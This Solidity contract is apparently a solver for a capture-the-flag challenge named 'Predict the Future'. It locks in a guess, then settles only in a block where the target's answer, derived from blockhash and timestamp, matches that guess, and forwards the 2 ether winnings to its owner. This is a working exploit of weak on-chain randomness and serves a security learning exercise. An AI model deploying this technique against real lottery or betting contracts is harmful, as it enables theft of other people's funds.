// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;
interface IChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns(bool);
}

contract PredictTheFutureSolver {

    address owner;
    IChallenge challenge;
    uint8 guess;

    constructor(address _challenge,uint8 _guess) payable {
        challenge = IChallenge(_challenge);
        owner = msg.sender;
        guess = _guess;
        challenge.lockInGuess{value: 1 ether}(guess);
    }

    function settleChallenge() external payable {
        uint8 answer = uint8(
            uint256(  
                keccak256( abi.encodePacked(
                    blockhash(block.number - 1), block.timestamp)
                )
            )
        );
        if(answer != guess) return;

        require(answer == guess, "SPAM WRONG value");
        challenge.settle();
        payable(owner).transfer(2 ether);
    }

    receive() external payable {
    }
    
}